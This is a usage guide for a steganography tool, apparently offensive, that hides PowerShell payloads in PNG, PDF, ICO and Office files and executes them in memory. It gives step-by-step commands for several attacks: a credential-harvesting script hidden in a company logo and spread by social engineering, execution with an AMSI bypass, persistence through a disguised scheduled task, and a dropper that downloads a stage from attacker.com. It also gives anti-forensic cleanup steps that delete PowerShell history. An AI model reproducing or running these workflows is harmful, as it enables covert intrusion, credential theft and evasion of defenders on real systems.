# PS1Stealth Usage Examples

## Example 1: Basic Steganography

### Step 1: Create a test script
```powershell
@"
Write-Host 'Hello from hidden script!'
Get-Date
whoami
"@ | Out-File test.ps1
```

### Step 2: Find a carrier image
Use any PNG or BMP image. For testing, you can create one:
```powershell
# Create a simple colored image using PowerShell
Add-Type -AssemblyName System.Drawing
$bmp = New-Object System.Drawing.Bitmap(800, 600)
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.Clear([System.Drawing.Color]::SkyBlue)
$graphics.Dispose()
$bmp.Save("carrier.png", [System.Drawing.Imaging.ImageFormat]::Png)
$bmp.Dispose()
```

### Step 3: Embed the script
```powershell
.\PS1Stealth.exe embed test.ps1 carrier.png output.png --method ImageLSB --password "MySecret123"
```

### Step 4: Verify the image still works
```powershell
# Open output.png - it should look identical to carrier.png
Start-Process output.png
```

### Step 5: Extract and execute
```powershell
# Extract
.\PS1Stealth.exe extract output.png extracted.ps1 --method ImageLSB --password "MySecret123"

# Execute directly (in-memory, no file written)
.\PS1Stealth.exe execute output.png --method ImageLSB --password "MySecret123"
```

---

## Example 2: PDF Polyglot

### Create a legitimate PDF
```powershell
# You can use any existing PDF or create one with:
# - Microsoft Word → Save as PDF
# - Any online PDF generator
# - Or use an existing document
```

### Embed payload
```powershell
.\PS1Stealth.exe embed test.ps1 document.pdf output.pdf --method PdfPolyglot --password "PDFSecret"
```

### Test the PDF
```powershell
# The PDF should still open normally
Start-Process output.pdf

# But it contains a hidden payload
.\PS1Stealth.exe execute output.pdf --method PdfPolyglot --password "PDFSecret"
```

---

## Example 3: Office Document (DOCX/XLSX)

### Use ZIP comment method for Office files
```powershell
# DOCX, XLSX, PPTX are all ZIP files internally
.\PS1Stealth.exe embed test.ps1 Report.docx Report_Updated.docx --method ZipComment --password "Office123"

# Document remains fully functional
Start-Process Report_Updated.docx

# Extract hidden script
.\PS1Stealth.exe extract Report_Updated.docx hidden.ps1 --method ZipComment --password "Office123"
```

---

## Example 4: Red Team Scenario - Credential Harvesting

### Create a credential harvesting script
```powershell
@"
# Gather system information
`$computerName = `$env:COMPUTERNAME
`$domain = `$env:USERDOMAIN
`$username = `$env:USERNAME

# Get saved credentials (requires elevation)
try {
    `$creds = cmdkey /list
    `$output = @"
=== Credential Harvest Results ===
Computer: `$computerName
Domain: `$domain  
User: `$username
Time: `$(Get-Date)

Saved Credentials:
`$creds
===================================
"@
    
    # In real scenario, exfiltrate to C2 server
    # For demo, just display
    Write-Host `$output
    
} catch {
    Write-Host "Error: `$_"
}
"@ | Out-File harvest.ps1
```

### Embed in a company logo
```powershell
.\PS1Stealth.exe embed harvest.ps1 company_logo.png logo.png --method ImageLSB --password "Corp2024!"
```

### Distribute the logo (social engineering)
- Email as part of a template
- Place on shared drive
- Include in documents

### Execute on target
```powershell
# When on target system, execute
.\PS1Stealth.exe execute logo.png --method ImageLSB --password "Corp2024!" --bypass-amsi
```

---

## Example 5: Persistence via Scheduled Task

### Create a beacon script
```powershell
@"
# Simple beacon to confirm execution
`$time = Get-Date
`$computer = `$env:COMPUTERNAME
`$message = "Beacon from `$computer at `$time"

# In production, send to C2 server
# For demo:
Add-Content -Path "`$env:TEMP\beacon.log" -Value `$message
"@ | Out-File beacon.ps1
```

### Embed in wallpaper image
```powershell
.\PS1Stealth.exe embed beacon.ps1 wallpaper.jpg wallpaper_modified.jpg --method ImageLSB --password "Beacon123"
```

### Create scheduled task
```powershell
# Create a task that executes the hidden script daily
$action = New-ScheduledTaskAction -Execute "PS1Stealth.exe" -Argument "execute C:\Path\To\wallpaper_modified.jpg --method ImageLSB --password Beacon123"
$trigger = New-ScheduledTaskTrigger -Daily -At 9am
Register-ScheduledTask -TaskName "WallpaperSync" -Action $action -Trigger $trigger
```

---

## Example 6: Multi-Stage Payload

### Stage 1: Dropper (small, retrieves main payload)
```powershell
@"
# Stage 1: Download and execute stage 2
`$stage2Url = 'https://attacker.com/image.png'
`$stage2Path = "`$env:TEMP\temp.png"

Invoke-WebRequest -Uri `$stage2Url -OutFile `$stage2Path
& PS1Stealth.exe execute `$stage2Path --method ImageLSB --password 'Stage2Pass'

Remove-Item `$stage2Path -Force
"@ | Out-File stage1.ps1
```

### Embed stage 1 in small icon
```powershell
.\PS1Stealth.exe embed stage1.ps1 small_icon.ico dropper.ico --method IcoAtom --password "Stage1Pass"
```

### Stage 2: Main payload (larger, more capabilities)
```powershell
# Create your main payload script
# Embed in larger image for hosting
.\PS1Stealth.exe embed main_payload.ps1 large_image.png stage2.png --method ImageLSB --password "Stage2Pass"
```

---

## Example 7: Testing Different Methods

### Compare all embedding methods
```powershell
# Test script
$testScript = "Write-Host 'Method test successful!'; Get-Date"
$testScript | Out-File method_test.ps1

# ImageLSB
.\PS1Stealth.exe embed method_test.ps1 test.png lsb.png --method ImageLSB --password "test"

# ImagePolyglot  
.\PS1Stealth.exe embed method_test.ps1 test.png polyglot.ico --method ImagePolyglot --password "test"

# PdfPolyglot
.\PS1Stealth.exe embed method_test.ps1 test.pdf pdf.pdf --method PdfPolyglot --password "test"

# ZipComment
.\PS1Stealth.exe embed method_test.ps1 test.zip zip.zip --method ZipComment --password "test"

# IcoAtom
.\PS1Stealth.exe embed method_test.ps1 test.ico atom.ico --method IcoAtom --password "test"

# Test each one
Write-Host "Testing ImageLSB..."
.\PS1Stealth.exe execute lsb.png --method ImageLSB --password "test"

Write-Host "Testing ImagePolyglot..."
.\PS1Stealth.exe execute polyglot.ico --method ImagePolyglot --password "test"

# ... and so on
```

---

## Security Considerations

### Operational Security (OpSec)

1. **Password Management**
   - Use strong, unique passwords
   - Don't hardcode passwords in scripts
   - Consider using environment variables

2. **File Naming**
   - Use inconspicuous names
   - Match organizational naming conventions
   - Avoid suspicious extensions

3. **Cleanup**
   - Remove original .ps1 files after embedding
   - Clear PowerShell history
   - Remove temporary files

```powershell
# Cleanup example
Remove-Item *.ps1 -Force
Remove-Item $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Clear-RecycleBin -Force
```

4. **Network Indicators**
   - Be aware of network monitoring
   - Use HTTPS for C2 communication
   - Implement domain fronting if needed

---

## Troubleshooting

### Common Issues

**Issue**: "No embedded payload found"
```powershell
# Make sure you're using the same method for extract/execute as you used for embed
# Check password is correct
```

**Issue**: "Image too small"
```powershell
# ImageLSB needs ~8 pixels per byte
# Use larger image or compress more aggressively
# Or switch to ImagePolyglot method
```

**Issue**: "AMSI detected the script"
```powershell
# Use --bypass-amsi flag
# Consider additional obfuscation
# Encrypt sensitive strings
```

---

## Best Practices

1. **Always test in a controlled environment first**
2. **Use encryption for sensitive payloads**
3. **Keep carrier files legitimate-looking**
4. **Rotate passwords regularly**
5. **Monitor for detection**
6. **Have a cleanup plan**
7. **Document your operations**
8. **Follow responsible disclosure**

---

**Remember**: Only use on systems you own or have explicit authorization to test!
